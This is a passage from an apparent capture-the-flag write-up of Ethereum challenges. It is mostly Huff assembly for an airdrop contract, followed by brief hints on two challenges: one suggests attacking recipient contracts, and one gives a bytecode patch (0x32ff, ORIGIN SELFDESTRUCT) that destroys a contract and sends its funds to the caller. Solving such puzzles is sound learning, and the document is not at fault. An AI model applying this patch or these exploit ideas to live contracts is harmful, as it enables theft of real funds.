    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757005 0x60 mstore 0xDd18540f4184b9C09bC9A6ac956C1618d97963D8 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757006 0x60 mstore 0x29119D0F48fa5bDD76cfd904c2fd9389c96BDa3c 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757007 0x60 mstore 0xe9bd3dC7848EcDCfc711F9da03339fE56a33c0FF 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757008 0x60 mstore 0xAaA49Ef80319CdD6887899c896B12Ae297441b71 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757009 0x60 mstore 0x7abFdFb5e1A4BA1673632163903004336e0fC995 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700a 0x60 mstore 0x28a57252b45c3F3F4dd598Ae1029Bb1702Dd4f6C 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700b 0x60 mstore 0x4Cf1Ae09E45D29032B10b6b8a26e9293144FB615 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700c 0x60 mstore 0xAF7fB87DC79202681eb57f023172b589398b8AB4 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700d 0x60 mstore 0x7C4931e3f65801f358aC9744fdaeF2A3678B11B4 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700e 0x60 mstore 0xb28d8aa2D1D8535049d3E6859A9c04EA7c77E375 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e775700f 0x60 mstore 0x5b8B71774e668A321601471710848C9F3D3aCB65 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757010 0x60 mstore 0x763c1D8e825cC56487F3Cf9Feb6a958444934E89 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757011 0x60 mstore 0x5a75bfd44F9f99423Db15573aD00b0745Cf9549F 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757012 0x60 mstore 0x9e84C5679B4021dC6a5707900dE31FD5dd1E8DaD 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757013 0x60 mstore 0x02984f8b630CdE6eaa86f4FA40d7FB3fA7C6a9aa 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call
    0x785629f8e113cb3ca79e662f7fe8572805887586eed803e8fc27d346e7757014 0x60 mstore 0x23F9f183D9cEB5946dd5359408e3ab2E122D8Ead 0x40 mstore 0x00 0x64 0x1c 0x00 [ERC721_TOKEN] 0x8000 call

    stop
}

#define macro MAIN() = takes (0) returns (0) {
    calldatasize 0x484 eq sig_airdrop_eth jumpi
    calldatasize 0x4c4 eq sig_airdrop_erc20 jumpi

    AIRDROP_ERC721()

    sig_airdrop_eth: AIRDROP_NATIVE()
    sig_airdrop_erc20: AIRDROP_ERC20()
}
```

### Free Real Estate

The claim contract and the token are all well-known contracts so they are unlikely to be exploitable. Most of, or maybe all recipients in the merkle tree files, are contract account. So try to hack those contracts!

### Cosmic Radiation

Modify the first two byte of contract to 0x32ff, which is ORIGIN SELFDESTRUCT



